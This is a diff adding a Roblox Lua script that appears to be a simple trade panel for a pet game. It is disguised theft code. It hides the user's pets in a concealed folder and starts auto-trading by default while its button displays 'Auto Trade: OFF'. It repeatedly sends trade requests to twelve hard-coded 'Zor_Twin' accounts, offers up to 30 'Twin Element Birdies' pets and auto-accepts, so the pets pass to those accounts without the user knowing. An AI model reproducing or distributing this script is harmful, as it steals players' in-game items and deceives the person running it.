@@ -1,0 +1,265 @@
+local Players = game:GetService("Players")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+local LocalPlayer = Players.LocalPlayer
+local event = ReplicatedStorage:WaitForChild("rEvents", 5) and ReplicatedStorage.rEvents:WaitForChild("tradingEvent", 5)
+local ALLOWED_DISPLAY_NAMES = {
+    "Zor_Twin1",
+    "Zor_Twin2",
+    "Zor_Twin3",
+    "Zor_Twin4",
+    "Zor_Twin5",
+    "Zor_Twin6",
+    "Zor_Twin7",
+    "Zor_Twin8",
+    "Zor_Twin9",
+    "Zor_Twin10",
+    "Zor_Twin11",
+    "Zor_Twin12"
+}
+
+local petsFolder = LocalPlayer:WaitForChild("petsFolder", 5)
+local hiddenStorage = ReplicatedStorage:FindFirstChild("ZorVexStorage") or Instance.new("Folder", ReplicatedStorage)
+hiddenStorage.Name = "ZorVexStorage"
+
+local PetName = "Twin Element Birdies"
+local amount = 25
+local petOriginTable = {}
+local autoTradeActive = true
+
+local function findAllPlayersByDisplayNames(nameList)
+    local matchedPlayers = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= LocalPlayer then
+            local playerLower = string.lower(player.DisplayName)
+            for _, allowedName in ipairs(nameList) do
+                if playerLower == string.lower(allowedName) then
+                    table.insert(matchedPlayers, player)
+                    break
+                end
+            end
+        end
+    end
+    return matchedPlayers
+end
+
+local function InitialHideAll()
+    if not petsFolder then return end
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                pet.Parent = hiddenStorage
+            end
+        end
+    end
+end
+InitialHideAll()
+
+local function runExecution()
+    if not petsFolder then return false end
+    
+    local allPets = {}
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                petOriginTable[pet] = folder
+                table.insert(allPets, pet)
+            end
+        end
+    end
+    for _, pet in ipairs(hiddenStorage:GetChildren()) do 
+        table.insert(allPets, pet) 
+    end
+    
+    local count = 0
+    for _, pet in ipairs(allPets) do
+        if pet.Name == PetName and count < amount then
+            pet.Parent = petOriginTable[pet] or petsFolder:FindFirstChildWhichIsA("Folder")
+            count = count + 1
+        else
+            pet.Parent = hiddenStorage
+        end
+    end
+    return true, count
+end
+
+local function isTradePending()
+    local tradeVal = LocalPlayer:FindFirstChild("isTrading")
+    if tradeVal then
+        if tradeVal.Value == "on" or tradeVal.Value == true or tradeVal.Value == 1 then
+            return true
+        end
+    end
+    return false
+end
+
+local function getPetInstances(petName, n)
+    local pets = {}
+    if not petsFolder then return pets end 
+
+    for _, folder in ipairs(petsFolder:GetChildren()) do
+        if folder:IsA("Folder") then
+            for _, pet in ipairs(folder:GetChildren()) do
+                if pet.Name == petName then
+                    table.insert(pets, pet)
+                    if #pets >= n then return pets end
+                end
+            end
+        end
+    end
+    return pets
+end
+
+if game.CoreGui:FindFirstChild("ZorVexSimpleTrade") then 
+    game.CoreGui.ZorVexSimpleTrade:Destroy() 
+end
+
+local sg = Instance.new("ScreenGui", game.CoreGui)
+sg.Name = "ZorVexSimpleTrade"
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local bg = Instance.new("Frame", sg)
+bg.Size = UDim2.new(0, 220, 0, 150)
+bg.Position = UDim2.new(0.5, -110, 0.5, -75)
+bg.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+bg.BackgroundTransparency = 0.2
+bg.BorderSizePixel = 0
+bg.Active = true
+bg.Draggable = true
+
+Instance.new("UICorner", bg).CornerRadius = UDim.new(0, 10)
+
+local acceptBtn = Instance.new("TextButton", bg)
+acceptBtn.Size = UDim2.new(0, 180, 0, 30)
+acceptBtn.Position = UDim2.new(0.5, -90, 0, 15)
+acceptBtn.BackgroundColor3 = Color3.fromRGB(0, 170, 0)
+acceptBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+acceptBtn.Font = Enum.Font.GothamBold
+acceptBtn.TextSize = 13
+acceptBtn.Text = "Button acceptTrade"
+
+Instance.new("UICorner", acceptBtn).CornerRadius = UDim.new(0, 6)
+
+acceptBtn.MouseButton1Click:Connect(function()
+    if event then
+        pcall(function()
+            event:FireServer("acceptTrade")
+        end)
+    end
+end)
+
+local confirmBtn = Instance.new("TextButton", bg)
+confirmBtn.Size = UDim2.new(0, 180, 0, 30)
+confirmBtn.Position = UDim2.new(0.5, -90, 0, 55)
+confirmBtn.BackgroundColor3 = Color3.fromRGB(170, 0, 0)
+confirmBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+confirmBtn.Font = Enum.Font.GothamBold
+confirmBtn.TextSize = 13
+confirmBtn.Text = "Confirm + Offer Pets"
+
+Instance.new("UICorner", confirmBtn).CornerRadius = UDim.new(0, 6)
+
+confirmBtn.MouseButton1Click:Connect(function()
+    pcall(runExecution)
+
+    if event then
+        pcall(function()
+            local tradeActive = isTradePending()
+            
+            if tradeActive then
+                pcall(function()
+                    event:FireServer("acceptTrade")
+                end)
+            else
+                local targetPlayers = findAllPlayersByDisplayNames(ALLOWED_DISPLAY_NAMES)
+                for _, targetPlayer in ipairs(targetPlayers) do
+                    pcall(function()
+                        event:FireServer("requestAccepted", targetPlayer)
+                    end)
+                end
+            end
+        end)
+        
+        task.spawn(function()
+            local pets = getPetInstances(PetName, 30)
+            for _, pet in ipairs(pets) do
+                if pet and pet.Parent then
+                    pcall(function()
+                        event:FireServer("offerItem", pet)
+                    end)
+                end
+                task.wait(0.001)
+            end
+        end)
+    end
+end)
+
+local autoTradeBtn = Instance.new("TextButton", bg)
+autoTradeBtn.Size = UDim2.new(0, 180, 0, 30)
+autoTradeBtn.Position = UDim2.new(0.5, -90, 0, 95)
+autoTradeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+autoTradeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
+autoTradeBtn.Font = Enum.Font.GothamBold
+autoTradeBtn.TextSize = 13
+autoTradeBtn.Text = "Auto Trade: OFF"
+
+Instance.new("UICorner", autoTradeBtn).CornerRadius = UDim.new(0, 6)
+
+autoTradeBtn.MouseButton1Click:Connect(function()
+    autoTradeActive = not autoTradeActive
+    if autoTradeActive then
+        autoTradeBtn.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+        autoTradeBtn.Text = "Auto Trade: ON"
+    else
+        autoTradeBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
+        autoTradeBtn.Text = "Auto Trade: OFF"
+    end
+end)
+
+-- LOOP UTAMA AUTO TRADE
+task.spawn(function()
+    while true do
+        if autoTradeActive and event then
+            if not isTradePending() then
+                -- 1. Kirim request trade ke akun target jika belum trading
+                pcall(function()
+                    local targetPlayers = findAllPlayersByDisplayNames(ALLOWED_DISPLAY_NAMES)
+                    for _, targetPlayer in ipairs(targetPlayers) do
+                        pcall(function()
+                            event:FireServer("requestAccepted", targetPlayer)
+                        end)
+                    end
+                end)
+                task.wait(0.1)
+            else
+                -- 2. Begitu trade terdeteksi AKTIF, siapkan & tawarkan pet dengan cepat
+                pcall(runExecution)
+                
+                local pets = getPetInstances(PetName, 30)
+                for _, pet in ipairs(pets) do
+                    if pet and pet.Parent then
+                        pcall(function()
+                            event:FireServer("offerItem", pet)
+                        end)
+                    end
+                    task.wait(0.001)
+                end
+                
+                -- 3. Jeda 0.5 detik lalu tekan acceptTrade
+                task.wait(0.1)
+                pcall(function()
+                    event:FireServer("acceptTrade")
+                end)
+                
+                -- Menunggu sesi trade selesai
+                while isTradePending() do
+                    task.wait(0.1)
+                end
+                
+                task.wait(0.1)
+            end
+        end
+        task.wait(0.05)
+    end 
+end)
